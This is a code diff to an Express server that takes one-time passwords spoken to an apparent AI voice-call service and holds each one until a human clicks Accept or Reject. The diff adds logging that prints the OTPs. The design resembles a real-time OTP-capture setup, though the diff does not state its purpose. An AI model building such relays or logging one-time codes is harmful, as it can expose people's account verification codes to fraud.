@@ -11,7 +11,8 @@ const waiters = {}; // holds resolve functions for long-polling
 
 // Bland calls this when caller speaks OTP
 // We hold the response open until human clicks Accept/Reject (up to 55 seconds)
-app.post('/submit-otp', (req, res) => {
+app.post('/submit-otp', (req, res) => {console.log('SUBMIT-OTP HIT:', req.body);
+
   const { session_id, otp } = req.body;
   if (!session_id || !otp) return res.status(400).json({ error: 'Missing fields' });
 
@@ -39,7 +40,9 @@ app.post('/submit-otp', (req, res) => {
 });
 
 // Dashboard calls this when you click Accept/Reject
-app.post('/decide', (req, res) => {
+app.post('/decide', (req, res) => {console.log('DECIDE HIT:', req.body);
+console.log('PENDING KEYS:', Object.keys(pending));
+                                  
   const { session_id, decision } = req.body;
   if (!pending[session_id]) return res.status(404).json({ error: 'Not found' });
 
